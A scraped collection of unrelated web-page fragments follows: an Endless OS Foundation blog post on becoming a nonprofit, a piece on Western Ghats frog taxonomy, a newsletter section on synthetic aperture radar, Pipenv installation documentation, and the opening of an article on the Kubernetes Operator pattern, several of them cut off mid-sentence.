process.</li></ul><p>The book guides reader through building a microblogging platform, kind of like a social network, where multiple users can have their message boards and interact with each other, have their feeds, etc. The first few chapters deal with crash-course setting up a page where all the messages are displayed (no multiple users), and the form for entering a message is present, then it moves on to teach about core components of a web app (creating web server, request routing, handling, middleware…), another chapter deals with what <a href="https://luminusweb.com/" target="_blank">Luminus</a> templating library provides, then it moves on to using ClojureScript for SPA approach, which teaches very powerful and modern concepts. I decided to build something like a <em>beer-log</em> application, where I will keep track of craft beers that I’ve tried. I wanted to do something different, rather than following book paren-for-paren. Who knows, maybe my beer app will someday be good as, I don’t know, <a href="https://untappd.com/" target="_blank">Untappd</a> maybe?</p></div></div>]]>

<h3><strong>How our for-profit company became a nonprofit, to better tackle the digital divide.</strong></h3>



<p><em>Originally posted on the <a href="https://www.endlessos.org/blog" target="_blank" rel="noreferrer noopener">Endless OS Foundation blog</a>.</em></p>



<h4><strong>An 8-year journey to a nonprofit</strong></h4>



<p>On the 1st of April 2020, our for-profit Endless Mobile officially became a nonprofit as the Endless OS Foundation. Our launch as a nonprofit just as the global pandemic took hold was, predictably, hardly noticed, but for us the timing was incredible: as the world collectively asked â€œWhat can we do to help others in need?â€�, we framed our mission statement and launched our .org with the same very important question in mind. Endless always had a social impact mission at its heart, and the challenges related to students, families, and communities falling further into the digital divide during COVID-19 brought new urgency and purpose to our teamâ€™s decision to officially step in the social welfare space.</p>



<blockquote><p><strong>On April 1st 2020, our for-profit Endless Mobile officially became a nonprofit as the Endless OS Foundation, focused on the #DigitalDivide.</strong></p></blockquote>



<p>Our updated status was a long time coming: we began our transformation to a nonprofit organization in late 2019 with the realization that the true charter and passions of our team would be greatly accelerated without the constraints of for-profit goals, investors and sales strategies standing in the way of our mission of digital access and equity for all.&nbsp;</p>



<p>But for 8 years we made a go of it commercially, headquartered in Silicon Valley and framing ourselves as a tech startup with access to the venture capital and partnerships on our doorstep. We believed that a successful commercial channel would be the most efficient way to scale the impact of bringing computer devices and access to communities in need. We still believe this – weâ€™ve just learned through our experience that we donâ€™t have the funding to enter the computer and OS marketplace head-on. With the social impact goal first, and the hope of any revenue a secondary goal, we have had many successes in those 8 years bridging the digital divide throughout the world, from Brazil, to Kenya, and the USA. Weâ€™ve learned a huge amount which will go on to inform our strategy as a nonprofit.</p>



<blockquote id="viewer-9s0us"><p><strong>Endless always had a social impact mission at its heart. COVID-19 brought new urgency and purpose to our teamâ€™s decision to officially step in the social welfare space</strong>.</p></blockquote>



<h4><strong>Our unique perspective</strong></h4>



<p>One thing we learned as a for-profit is that the OS and technology weâ€™ve built has some unique properties which are hugely impactful as a working solution to digital equity barriers. And our experience deploying in the field around the world for 8 years has left us uniquely informed via many iterations and incremental improvements.<br></p>

<p>With this knowledge in-hand, weâ€™ve been refining our strategy throughout 2020 and now starting to focus on what it really means to become an effective nonprofit and make that impact. In many ways it is liberating to abandon the goals and constraints of being a for-profit entity, and in other ways itâ€™s been a challenging journey for me and the team to adjust our way of thinking and let these for-profit notions and models go. Previously we exclusively built and sold a product that defined our success; and any impact we achieved was a secondary consequence of that success and seen through that lens. Now our success is defined purely in terms of social impact, and through our actions, those positive impacts can be made with <em>or without</em> our â€œproductâ€�. That means that we may develop and introduce technology to solve a problem, but it is equally as valid to find another organization’s existing offering and design a way to increase that positive impact and scale.</p>



<blockquote><p><strong>We develop technology to solve access equity issues, but it’s equally as valid to find another organization’s offering and partner in a way that increases their positive impact.</strong></p></blockquote>



<p>The analogy to Free and Open Source Software is very strong – while Endless has always used and contributed to a wide variety of FOSS projects, weâ€™ve also had a tension where weâ€™ve been trying to hold some pieces back and capture value – such as our own application or content ecosystem, our own hardware platform – necessarily making us competitors to other organisations even though they were hoping to achieve the same things as us. As a nonprofit we can let these ideas go and just pick the best partners and technologies to help the people weâ€™re trying to reach.</p>



<figure><a href="https://ramcq.net/wp-content/uploads/sites/4/2021/01/231_Students_Endless-OS-Foundation_unsplash.jpg"><img loading="lazy" width="347" height="231" src="https://ramcq.net/wp-content/uploads/sites/4/2021/01/231_Students_Endless-OS-Foundation_unsplash.jpg" alt="School kids writing on paper" srcset="https://ramcq.net/wp-content/uploads/sites/4/2021/01/231_Students_Endless-OS-Foundation_unsplash.jpg 347w, https://ramcq.net/wp-content/uploads/sites/4/2021/01/231_Students_Endless-OS-Foundation_unsplash-300x200.jpg 300w" sizes="(max-width: 347px) 100vw, 347px"></a></figure>



<h4>Digital equity â€¦ 4 barriers we need to overcome</h4>



<p>In future, our decisions around which projects to build or engage with will revolve around 4 barriers to digital equity, and how our Endless OS, Endless projects, or our partnersâ€™ offerings can help to solve them. We define these 4 equity barriers as: barriers to <strong>devices</strong>, barriers to <strong>connectivity</strong>, barriers to <strong>literacy</strong> in terms of your ability to use the technology, and barriers to <strong>engagement</strong> in terms of whether using the system is rewarding and worthwhile.</p>



<blockquote id="viewer-5r9ec"><p><strong>We define the 4 digital equity barriers we exist to impact as:</strong><br>1. barriers to <strong>devices</strong><br>2. barriers to <strong>connectivity</strong><br>3. barriers to <strong>literacy</strong><br>4. barriers to <strong>engagement</strong></p></blockquote>



<p>It doesnâ€™t matter who makes the solutions that break these barriers; what matters is how we assist in enabling people to use technology to gain access to the education and opportunities these barriers block. Our goal therefore is to simply ensure that solutions exist â€“ building them ourselves and with partners such as the FOSS community and other nonprofits â€“ proving them with real-world deployments, and sharing our results as widely as possible to allow for better adoption globally.</p>



<p>If we define our goal purely in terms of whether people are using Endless OS, we are effectively restricting the reach and scale of our solutions to the audience we can reach directly with Endless OS downloads, installs and propagation. Conversely, partnerships that scale impact are a win-win-win for us, our partners, and the communities we all serve.&nbsp;</p>



<h4><strong>Engineering impact</strong></h4>



<p>Our Endless engineering roots and capabilities feed our unique ability to build and deploy all of our solutions, and the practical experience of deploying them gives us evidence and credibility as we advocate for their use. Either activity would be weaker without the other.</p>



<blockquote id="viewer-1i0jh"><p><strong>Our engineering roots and capabilities feed our unique ability to build and deploy digital divide solutions.</strong></p></blockquote>



<p>Our partners in various engineering communities will have already seen our change in approach. Particularly, with GNOME we are working hard to invest in upstream and reconcile the long-standing differences between our experience and GNOME. If successful, many more people can benefit from our work than just users of Endless OS. Weâ€™re working with Learning Equality on Kolibri to build a better app experience for Linux desktop users and bring content publishers into our ecosystem for the first time, and weâ€™ve also taken our very own Hack, the immersive and fun destination for kids learning to code, released it for non-Endless systems <a href="https://flathub.org/apps/details/com.hack_computer.Clubhouse">on Flathub</a>, and made it fully open-source.</p>



<figure><a href="https://ramcq.net/wp-content/uploads/sites/4/2021/01/231_Planning_Endless-OS-Foundation_unsplash.jpg"><img loading="lazy" width="347" height="231" src="https://ramcq.net/wp-content/uploads/sites/4/2021/01/231_Planning_Endless-OS-Foundation_unsplash.jpg" alt="Planning tasks with sticky notes on a whiteboard" srcset="https://ramcq.net/wp-content/uploads/sites/4/2021/01/231_Planning_Endless-OS-Foundation_unsplash.jpg 347w, https://ramcq.net/wp-content/uploads/sites/4/2021/01/231_Planning_Endless-OS-Foundation_unsplash-300x200.jpg 300w" sizes="(max-width: 347px) 100vw, 347px"></a></figure>



<h4><strong>Whatâ€™s next for our OS?</strong></h4>



<p>What then is in store for the future of Endless OS, the place where we have invested so much time and planning through years of iterations? For the immediate future, we need the capacity to deploy everything weâ€™ve built â€“ all at once, to our partners. We built an OS that we feel is very unique and valuable, containing a number of world-firsts: first production OS shipped with OSTree, first Flatpak-only desktop, built-in support for updating OS and apps from USBs, while still providing a great deal of reliability and convenience for deployments in offline and educational-safe environments with great apps and content loaded on every system.</p>



<p>However, we need to find a way to deliver this Linux-based experience in a more efficient way, and weâ€™d love to talk if you have ideas about how we can do this, perhaps as partners. Can the idea of â€œEndless OSâ€� evolve to become a spec that is provided by different platforms in the future, maybe remixes of Debian, Fedora, openSUSE or Ubuntu?&nbsp;</p>



<h4><strong>Build, Validate, Advocate</strong></h4>



<p>Beyond the OS, the Endless OS Foundation has identified multiple programs to help underserved communities, and in each case we are adopting our â€œbuild, validate, advocateâ€� strategy. This approach underpins all of our projects: can we <strong>build</strong> the technology (or assist in the making), will a community in-need <strong>validate</strong> it by adoption, and can we inspire others by telling the story and <strong>advocating</strong> for its wider use?</p>



<blockquote id="viewer-3t3do"><p><strong>We are adopting a â€œbuild, validate, advocateâ€� strategy.</strong><br>1. <strong>build</strong> the technology (or assist in the making)<br>2. <strong>validate</strong> by community adoption<br>3. <strong>advocate</strong> for its wider use</p></blockquote>



<p>As examples, we have just launched the Endless Key (link) as an offline solution for students during the COVID-19 at-home distance learning challenges. This project is also establishing a first-ever partnership of well-known online educational brands to reach an underserved offline audience with valuable learning resources. We are developing a pay-as-you-go platform and new partnerships that will allow families to own laptops via micro-payments that are built directly into the operating system, even if they cannot qualify for standard retail financing. And during the pandemic, weâ€™ve partnered with Teach For America to focus on very practical digital equity needs in the USAâ€™s urban and rural communities.</p>



<h4><strong>One part of the world-wide digital divide solution</strong></h4>



<p>We are one solution provider for the complex matrix of issues known collectively as the #DigitalDivide, and these issues will not disappear after the pandemic. Digital equity was an issue long before COVID-19, and we are not so naive to think it can be solved by any single institution, or by the time the pandemic recedes. It will take time and a coalition of partnerships to win. We are in for …</p></div></div>

              </p> <p>o what is a species? In the seventeenth century, European thinkers proposed that a group of organisms that could breed with each other could be called a species. A century on, Carl Linnaeus, the pioneering Swedish naturalist, popularised the use of combining two Latin terms: first the name of the genus,
            <a href="" onclick="return!1">
              <sup id="u7ivdfqvucs5">[8]</sup>
            </a>
           then that of the species. The yellow-eyed bush frog has the name <em>Raorchestes </em>because it signifies the genus <em>Raorchestes</em>, which encompasses almost 65 species of bush frogs mostly from South Asia; <em>flaviocularis</em>&nbsp;is its species.</p></div><p>For all this time, scientists have been having furious arguments about the best way to classify species. There are presently more than 30 approaches to define a species, variously based in ancestry, ecology, appearances, even sound. The general consensus these days is to take an “integrative” approach. So Vijay started off with <em>flaviocularis</em>’s distinct looks––its morphology––and then worked on tracing its family tree in the DNA lab. The distinctiveness of its metallic calls, as well as its geographical distribution, helped along the hypothesis that <em>flaviocularis</em> was a species that hadn’t been described previously.</p><p>“Documenting the existence of a species is the first step to understanding our biodiversity,” Shanker said. It’s an exciting field because there is so much we don’t know. Ecologists have terms of art associated with these knowledge gaps. The Linnean Shortfall refers to the problem of undescribed lineages. A Wallacean Shortfall
            <a href="" onclick="return!1">
              <sup id="wszrks8kngx3">[9]</sup>
            </a>
           refers to the lack of information about a species’ geographical distribution. “These shortfalls are the starting point for our exploration of ecology and evolution. There are lots of questions that can be answered once both these knowledge gaps are addressed,” said Shanker.</p><p>One set of questions is evolutionary in nature: Where did a species originate? If it started from Africa, how did it find its way into Asia and diversify? That’s how we got Asian elephants for instance: fossil remains indicate that the first elephant ancestors originated in Africa during the geological epoch known as the Early Pliocene.
            <a href="" onclick="return!1">
              <sup id="hfc0ff8tqwol">[10]</sup>
            </a>
           Recent genetic and fossil studies now confirm that their descendants moved into Asia 2-4 million years ago, and gave rise to the modern Asian elephant just 2.5 lakh years ago.</p><div data-v-2fd21b62=""><p>Geographic barriers such as deep gorges and wide rivers also affect dispersal, and can isolate populations. The gaps and valleys of the Western Ghats explain why there are so many different kinds of bush frogs. A species’ own ability to move around determines the kind of places it eventually gets to: birds are likelier than frogs to move from one mountain to another, for example.</p><p>Then they could ask after ecological factors such as rainfall, temperature and altitude, gradients along which species can adapt and evolve into different groups. </p></div><p>Finally, there are questions related to conservation. Research may focus on the availability of a type of plant if it appears that a species relies on it for survival. This data is analysed to help us approach answers to speculative questions like: what could happen to the species a hundred years from now; how would they adapt to climate change? </p><p>One of the things that is clear after a couple of centuries of study is that the species richness of a region increases as you move from the poles to the tropics. Within the tropics, you get “biodiversity hotspots.”

           These are sites that represent only 2.4% of the earth’s land surface, support more than 40% of endemic fauna, and are threatened by human habitation.</p><p>The Himalayas, with an estimated 10,000 species of plants including more than 3,100 endemics, is one of them. The states of north-eastern India that form part of the larger Indo-Burma hotspot are another. But easily the most well-studied hotspot in India is the Western Ghats.</p></div></div></div></div></div></div><div data-v-2fd21b62=""><section data-v-2fd21b62=""><div data-v-2fd21b62=""><div data-v-2fd21b62=""><div data-v-2fd21b62=""><p data-v-2fd21b62=""><h3>Two</h3></p> <div data-v-2fd21b62=""><div data-v-2fd21b62=""><p>

              </p> <p>he Western Ghats stretch almost parallel to India’s west coast. They variously constitute about 1600kms of sparse and dense forests, blue mountains, steep cliffs, thorny bushes, flat plateaus, leech-ridden swamps and windy grasslands. At one end, they start as shrub-bearing hillocks about 10km north of India’s southernmost tip. Then, they become the Ashambu Hills, mighty granite mountains forming a natural border between Tamil Nadu and Kerala, and in the shadow of which lie spice gardens and homesteads.</p></div><p>Then comes the Shencottah Gap. After those 7km, the Ghats rise again to form the Meghamalai Hills, home of <em>flaviocularis</em>, the yellow-eyed bush frog. These are followed by a small plateau which leads to the hills of Palani and Anamalai. Cardamom, coffee and tea plantations blanket the slopes here. Look up, and mist permitting, you can see some of the tallest peaks in the south—“sky islands,” hosting ecosystems wildly different from those of the surrounding lowlands. In the shallow valleys of these highlands, naturally stunted forests known as the “sholas” occur alongside open grassland patches. </p><p>North of the Anamalais come the Nilgiris. But first, there’s a deep valley. At 32km wide, 100m above sea level, the Palghat Gap is the widest and lowest pass in the Ghats. A dusty national highway cuts right through it, connecting Coimbatore in Tamil Nadu and Palakkad in Kerala.</p><p>Beyond, the Ghats stretch into north Kerala and Karnataka, its high peaks separated occasionally by shallow valleys. They almost kiss the Arabian Sea before swerving east into Goa. By the time they taper off amidst the sugarcane fields of Maharashtra, they are less imposing and more climbable, now ambling along until they reach their other end in the deciduous forest tracts of south Gujarat.&nbsp; </p><p>The remarkable contiguity broken by wide gaps and valleys, the sheer range of landscapes, the distance covered: all this should indicate why the Ghats are a species discovery hotspot. They comprise less than 6% of India’s land area but are home to more than 30% of all plant, fish, amphibian, reptile, bird and mammal species found in the country. Of the 406 known frog and toad species in India, more than 200 are endemic to the Ghats. Over a hundred of these endemics have been discovered only in the last 20 years. </p></div></div></div></div></section></div><div data-v-2fd21b62=""><section data-v-2fd21b62=""><div data-v-2fd21b62=""><div data-v-2fd21b62=""><div data-v-2fd21b62=""><p data-v-2fd21b62=""><h3>Three</h3></p> <div data-v-2fd21b62=""><div data-v-2fd21b62=""><p>

              </p> <p>NA-based techniques have transformed new species research across the world. Uma Ramakrishnan, a conservation geneticist and professor at Bengaluru’s National Centre for Biological Sciences who led the genetic component of the research on sholakilis and chilappans, told me that India was still heavily reliant on morphological methods and distribution information till about a decade ago. Now there’s a whole suite of new technologies, including better computational and simulation programmes, that have popularised the use of genetic techniques to answer ecological questions. These technologies both advance and confirm the educated hunches researchers develop as they work.</p></div><p>There’s a flip side to this, too: taxonomic inflation, the over-categorisation of newly sighted animals. Some experts feel that researchers have begun claiming the tag of “new species” in cases where it is clearly unwarranted. Robin Kurian Abraham, a researcher at the University of Kansas, told me that the “overinflation” problem afflicts some Indian frog lineages too. Often, “new species” might just be sub-species, or different populations of the same species. “Why is it that we rarely hear of sub-species in frogs? There are even five extant sub-species of tigers across the world,” Abraham asked me.</p><p>The ‘species versus sub-species’ debate has been raging for years. Take the world of wolf taxonomy as an example. The grey wolf (<em>Canis lupus)</em> is found in most parts of the world. In 2018, a paper published in <em>Global Ecology and Conservation</em> by a team of researchers led by Geraldine Werhahn created a splash. DNA analysis using scat and hair samples of the Himalayan wolf had revealed a genetic adaptation to cope with the lower oxygen levels of high altitudes.</p><p>It provided a massive shot in the arm to the theory that the Himalayan wolf is evolutionarily distinct: its lineage diverged before the radiation of the modern grey wolf. But the journey to species-hood is long and arduous. In February last year, Werhahn told <em>The Guardian</em> that researchers needed to obtain one final piece of higher-quality genomic data for the separate species case to succeed with the International Union for Conservation of Nature or IUCN, the global organisation which evaluates and assesses conservation status. That quest is still on.</p></div></div></div></div></section></div></div>]]>

But, when compared to optical approaches, radar resolution is challenging, especially at orbital altitude due to the large physical antenna sizes necessary for handling electromagnetic waves 4,000x longer than visible light. To improve resolution, <a href="https://medium.com/the-downlinq/sar-101-an-introduction-to-synthetic-aperture-radar-2f0b6246c4a0" target="_blank">Synthetic Aperture Radar</a> (SAR) combines data from multiple radar pulses as a platform moves past a target, creating images with resolutions comparable to an infeasibly large <a href="http://www.geo.hunter.cuny.edu/terrain/radariii.html" target="_blank">real aperture radar</a>. (Another way to visualize SAR is that it works similarly to <a href="https://www.radartutorial.eu/06.antennas/Phased%20Array%20Antenna.en.html" target="_blank">phased-array antennas,</a> but multiplexes a single antenna in time relative to a stationary target vs multiple antennas in space relative to a moving target.) SAR, <a href="https://en.wikipedia.org/wiki/Synthetic-aperture_radar#History" target="_blank">first developed in the ‘50s</a> for military applications, has led to important scientific findings, such as the <a href="https://www2.jpl.nasa.gov/magellan/guide5.html" target="_blank">terrain imaging of Venus</a> and the detection of liquid hydrocarbon lakes on Titan (<a href="http://lunar.earth.northwestern.edu/courses/450/titanlakes.pdf" target="_blank">paper</a>). Today’s SAR systems have increased resolution and decreased cost, leading to a boom in smallsat SAR data from multiple new providers, including <a href="https://www.ursaspace.com/" target="_blank">Ursa</a>, <a href="https://www.capellaspace.com/" target="_blank">Capella</a>, <a href="https://www.iceye.com/" target="_blank">ICEYE</a>, <a href="https://i-qps.net/" target="_blank">iQPS</a>, <a href="https://www.predasar.com/" target="_blank">PredaSAR</a>, <a href="https://synspective.com/" target="_blank">Synspective</a>, and <a href="https://umbra.space/" target="_blank">Umbra</a> (who <a href="https://spacenews.com/umbra-raises-32-million/" target="_blank">just raised $32 million in additional funding</a>). Capella Space is one of the industry leaders with resolutions of 50cm x 50cm from a 10-meter antenna deployed from a ~40kg smallsat (two of these were on Transporter-1, see below). According to Capella's lead SAR scientist, this resolution would require a real aperture radar of 49 km (yes, <em>kilo</em>meters). SAR resolution along the orbital ground track (aka “azimuth” or “cross-range” resolution) is determined by radar pulse processing frequency—and therefore doesn't degrade with altitude, unlike optical and real aperture radar—, while the side looking "range" resolution is primarily determined by the radar's wavelength (many high-res SAR platforms use the ~3 cm <a href="https://en.wikipedia.org/wiki/X_band" target="_blank">8–12 GHz X-band</a>, including Capella). SAR's drawbacks include vertical height distortion (called layover and foreshortening) and shadowing due to its side-looking orientation in relation to the craft's ground track (SAR cannot look straight down). SAR is also unable to accurately observe moving targets and can produce significant amounts of “<a href="https://en.wikipedia.org/wiki/Speckle_(interference)" target="_blank">speckling</a>” and noise due to reflectance from rough surfaces and corners (a good <a href="https://youtu.be/u2bUKEi9It4" target="_blank">recent video overview</a> of SAR). But, its side-looking orientation enables its high range (or “cross-track”) resolution, and when paired with elevation maps it can be used to reconstruct 3D models of the observation area—an <a href="https://appliedsciences.nasa.gov/join-mission/training/english/introduction-synthetic-aperture-radar" target="_blank">intro to SAR course from NASA</a>. Commercial applications of high-resolution SAR data have been speculated on (including your usual suspects of maritime tracking, crop monitoring, defense intelligence, and climate, with compelling all-weather natural disaster response added to the mix), but we don’t have many examples of real-world commercial use-cases just yet. Related: the <a href="https://asf.alaska.edu/#" target="_blank">Alaska Satellite Facility</a> has a good repository of SAR data available if you’d like to experiment with some yourself.</p></div><!--[if mso]> <![endif]--> <!--[if mso]></table><![endif]--></div><div><table><tbody><tr><td> <a href="https://www.prnewswire.com/in/news-releases/capella-space-releases-the-highest-resolution-commercial-sar-imagery-in-the-world-876646188.html" title="" target="_blank"> <img alt="" src="https://mcusercontent.com/e215b9e6f9a105b2c34f627a3/images/c4984c9b-9c36-45b2-aaea-f57a94b357f4.jpg" width="564"> </a></td></tr><tr><td><p>A <a href="https://www.prnewswire.com/in/news-releases/capella-space-releases-the-highest-resolution-commercial-sar-imagery-in-the-world-876646188.html" target="_blank">SAR image</a> of a floating Chinese solar farm including panels, apparently laid out to resemble a fish.</p></td></tr></tbody></table></div><div> <!--[if mso]><table align="left" border="0" cellspacing="0" cellpadding="0" width="100%" style="width:100%;"><tr> <![endif]--> <!--[if mso]><td valign="top" width="600" style="width:600px;"> <![endif]--><div><p><a href="#all-the-missions-on-transporter-1">¶</a><strong id="all-the-missions-on-transporter-1">All the missions on Transporter-1.</strong> So what was in the flotilla of 143 satellites launched on SpaceX’s Jan 24th Transporter-1 rideshare mission?

<p><strong>Pipenv</strong> is a tool that aims to bring the best of all packaging worlds (bundler, composer, npm, cargo, yarn, etc.) to the Python world. <em>Windows is a first-class citizen, in our world.</em></p>
<p>It automatically creates and manages a virtualenv for your projects, as well as adds/removes packages from your <code><span>Pipfile</span></code> as you install/uninstall packages. It also generates the ever-important <code><span>Pipfile.lock</span></code>, which is used to produce deterministic builds.</p>
<p>Pipenv is primarily meant to provide users and developers of applications with an easy method to setup a working environment. For the distinction between libraries and applications and the usage of <code><span>setup.py</span></code> vs <code><span>Pipfile</span></code> to define dependencies, see <a href="https://pipenv.pypa.io/en/latest/advanced/#pipfile-vs-setuppy"><span>☤ Pipfile vs setup.py</span></a>.</p>
<p><a href="https://gist.githubusercontent.com/jlusk/855d611bbcfa2b159839db73d07f6ce9/raw/7f5743401809f7e630ee8ff458faa980e19924a0/pipenv.gif"><img alt="a short animation of pipenv at work" src="https://gist.githubusercontent.com/jlusk/855d611bbcfa2b159839db73d07f6ce9/raw/7f5743401809f7e630ee8ff458faa980e19924a0/pipenv.gif"></a></p><p>The problems that Pipenv seeks to solve are multi-faceted:</p>
<ul>
<li>You no longer need to use <code><span>pip</span></code> and <code><span>virtualenv</span></code> separately. They work together.</li>
<li>Managing a <code><span>requirements.txt</span></code> file can be problematic, so Pipenv uses <code><span>Pipfile</span></code> and <code><span>Pipfile.lock</span></code> to separate abstract dependency declarations from the last tested combination.</li>
<li>Hashes are used everywhere, always. Security. Automatically expose security vulnerabilities.</li>
<li>Strongly encourage the use of the latest versions of dependencies to minimize security risks <a href="https://www.owasp.org/index.php/Top_10-2017_A9-Using_Components_with_Known_Vulnerabilities">arising from outdated components</a>.</li>
<li>Give you insight into your dependency graph (e.g. <code><span>$</span> <span>pipenv</span> <span>graph</span></code>).</li>
<li>Streamline development workflow by loading <code><span>.env</span></code> files.</li>
</ul>
<p>You can quickly play with Pipenv right in your browser:</p>

<h2>Install Pipenv Today!<a href="#install-pipenv-today" title="Permalink to this headline">¶</a></h2>
<p>If you already have Python and pip, you can easily install Pipenv into your home directory:</p>
<div><div><pre><span></span>$ pip install --user pipenv
</pre></div>
</div>
<p>Or, if you’re using Fedora 28:</p>
<div><div><pre><span></span>$ sudo dnf install pipenv
</pre></div>
</div>
<p>It’s possible to install Pipenv with Homebrew on MacOS, or with Linuxbrew on Linux systems. However, <strong>this is now discouraged</strong>, because updates to the brewed Python distribution will break Pipenv, and perhaps all virtual environments managed by it. You’ll then need to re-install Pipenv at least. If you want to give it a try despite this warning, use:</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><a name="cut"></a>
I've been using Kubernetes for almost a year now and, to be honest, I like the experience so far. Most of my use cases were rather trivial and thanks to its declarative approach, Kubernetes makes deploying and scaling stateless services pretty simple. I usually just describe my application in a YAML file as a set of interconnected services, feed it to Kubernetes, and let the built-in <a href="https://kubernetes.io/docs/concepts/architecture/controller/">control loops</a> bring the state of the cluster closer to the desired state by creating or destroying some resources for me automagically.</p>
<p>However, many times I've heard that <a href="https://www.lastweekinaws.com/podcast/screaming-in-the-cloud/the-staying-power-of-kubernetes-with-kelsey-hightower/">the real power of Kubernetes comes with its extensibility</a>. Kubernetes designed for automation. It brings a lot of useful automation out of the box. But it also provides extension points that can be used to customize Kubernetes capabilities. The cleverness of the Kubernetes design is that it encourages you to keep the extensions feel native! So when I stumbled upon the first few Kubernetes Operators on my Ops way, I could not even recognize that I'm dealing with custom logic...</p>
<p>In this article, I'll try to take a closer look at the Operators pattern, see which Kubernetes parts are involved in operators implementation, and what makes operators feel like first-class Kubernetes citizens. Of course, with as many pictures as possible.
<a name="eofcut"></a></p>
<h2 id="kubernetes-objects-and-controllers">Kubernetes Objects and Controllers</h2>
<p>Everything in Kubernetes seems to revolve around <a href="https://kubernetes.io/docs/concepts/overview/working-with-objects/kubernetes-objects/">objects</a> and <a href="https://kubernetes.io/docs/concepts/architecture/controller/">controllers</a>.</p>
<p>Kubernetes objects such as Pods, Namespaces, ConfigMaps, or Events are persistent entities in the Kubernetes system. Kubernetes uses these entities to represent the state of your cluster. Objects are also used as "records of intent." By creating (or removing) objects one can describe the <em>desired</em> state of the Kubernetes cluster.</p>
<p><i>Objects are like data structures.</i></p>
<p>On the other hand, controllers are infinite loops that watch the <em>actual</em> and the <em>desired</em> states of your cluster. When these two states diverge, controllers start making changes aiming to bring the current state of the cluster closer to the desired one.</p>
<p><i>Controllers are like algorithms.</i></p>
<p><img src="https://iximiuz.com/kubernetes-operator-pattern/kube-control-loop-3000-opt.png" width="100%" alt="Kubernetes Control Loop">
</p>

<p>I'll get to the controllers part later in this article and now let's focus on the objects.</p>
<h2 id="kubernetes-api-architecture">Kubernetes API Architecture</h2>
<p>All interactions with Kubernetes objects, <a href="https://kubernetes.io/docs/reference/using-api/client-libraries/">directly</a> or <a href="https://kubernetes.io/docs/reference/kubectl/overview/">indirectly</a>, happen through <a href="https://kubernetes.io/docs/concepts/overview/kubernetes-api/">Kubernetes API</a> - a highly structured masterpiece of software design.</p>
<p>There is a ton of documentation written on Kubernetes API and related topics and I spent quite some time digesting it. Since we are going to talk about the Kubernetes Operator pattern which heavily depends on the capabilities of the Kubernetes API, it's important to familiarize ourselves with the API design principles first. Following is my super-condensed excerpt from the docs.</p>
<p>Kubernetes offers a RESTful declarative HTTP API. Still remember those Kubernetes objects? <a href="https://kubernetes.io/docs/concepts/extend-kubernetes/api-extension/custom-resources/#custom-resources">A collection of objects of a certain kind form an <em>API resource</em></a>:</p>
<blockquote>
<p>A resource is an endpoint in the Kubernetes API that stores a collection of API objects of a certain kind; for example, the built-in pods resource contains a collection of Pod objects.</p>
</blockquote>
<p>You can always check the list of available API resources using <code>kubectl api-resources</code> command:</p>
<pre><code>$ kubectl api-resources
NAME          SHORTNAMES   APIVERSION   NAMESPACED   KIND
namespaces    ns           v1           false        Namespace
nodes         no           v1           false        Node
pods          po           v1           true         Pod
deployments   deploy       apps/v1      true         Deployment
jobs                       batch/v1     true         Job
...</code></pre>
<p>OK, great, we've got resources. But Kubernetes evolves quickly. What if a new attribute needs to be added to an existing resource definition? API versioning is always hard. <i>&lt;speculation mode&gt;</i>Apparently, Kubernetes API started with a common prefix <code>/api/&lt;version&gt;/&lt;resource&gt;</code> for all the API resources. However, a change in a single resource would require a whole API version bump. So, with the growth in the number of available resources, the need for some sort of grouping and subversioning emerged.<i>&lt;/speculation mode&gt;</i></p>
<p>API groups to the rescue! <a href="https://kubernetes.io/docs/concepts/overview/kubernetes-api/#api-groups-and-versioning">A bunch of related resources forms an API group</a>:</p>
<blockquote>
<p>To make it easier to evolve and to extend its API, Kubernetes implements API groups that can be enabled or disabled.</p>
</blockquote>
<p>You can also check the list of available API groups and their versions using <code>kubectl api-versions</code> command:</p>
<pre><code>$ kubectl api-versions
admissionregistration.k8s.io/v1
admissionregistration.k8s.io/v1beta1
apiextensions.k8s.io/v1
apiextensions.k8s.io/v1beta1
apiregistration.k8s.io/v1
apiregistration.k8s.io/v1beta1
apps/v1
...</code></pre>
<p>Well, at this point, I should warn you - it seems that in the documentation, the term <em>resource</em> is often used in the meaning of an <em>object</em> (but not vice versa). So, context matters.</p>
<p>In Kubernetes, objects of the same kind are distinguished by their names. So, if you start two Pods, both should get a unique name. But clusters can be pretty big and since names are supposed to be unique within a cluster, we need a mechanism to prevent collisions. Something like lots of logical clusters within one physical cluster. Allow me to introduce you to <a href="https://kubernetes.io/docs/concepts/overview/working-with-objects/namespaces/#when-to-use-multiple-namespaces"><em>namespaces</em></a>!</p>
<blockquote>
<p>Kubernetes supports multiple virtual clusters backed by the same physical cluster. These virtual clusters are called namespaces.</p>
</blockquote>
<blockquote>
<p>...</p>
</blockquote>
<blockquote>
<p>Namespaces provide a scope for names. Names of resources need to be unique within a namespace, but not across namespaces. Namespaces cannot be nested inside one another and each Kubernetes resource can only be in one namespace.</p>
</blockquote>
<p>Thus, API objects are fully qualified by their API group, resource type, namespace (unless cluster-scoped), and name.</p>
<p>Have you become totally confused by this time? No, worries, I've got a <del>simple</del> diagram for you 🙈</p>

    <p><img src="https://iximiuz.com/kubernetes-operator-pattern/kube-api-structure-3000-opt.png" width="100%" alt="Kubernetes API structure"></p><p><i>Kubernetes API structure.</i></p>
</div>

<p>So, a quick summary - we've learned about objects, resources, groups, and namespaces. But what's up with the promised customization?</p>
<h2 id="kubernetes-custom-resources">Kubernetes Custom Resources</h2>
<p>It seems like there is <a href="https://github.com/kubernetes/community/blob/master/sig-api-machinery/README.md">a great deal of effort</a> in keeping the Kubernetes API coherent but extensible.</p>
<p>What do I mean by <em>coherent</em> here? Kubernetes API consists of endpoints called <em>resources</em>. These API resources adhere to a set of common requirements - they are nouns and manipulated in a declarative manner (RESTful CRUD), they should be updated relatively infrequently and be reasonably small in size, their names should be <a href="https://kubernetes.io/docs/concepts/overview/working-with-objects/names/#dns-subdomain-names">valid DNS subdomains</a>, etc.</p>
<p>These restrictions allow unifying the resource workflows. For instance, you can get, describe, or update a collection of Pods in pretty much the same way as a collection of Services, Nodes, or RBAC roles:</p>
<pre><code>$ kubectl get pods
$ kubectl get services
$ kubectl get roles

$ kubectl describe pods  # or services, or roles

$ kubectl edit pods  # or services, or roles</code></pre>
<p>Not only <code>kubectl</code> benefits from this uniformity. Here is a full list of <a href="https://kubernetes.io/docs/concepts/extend-kubernetes/api-extension/custom-resources/#common-features">common features</a> enabled by the unified design:</p>
<div>
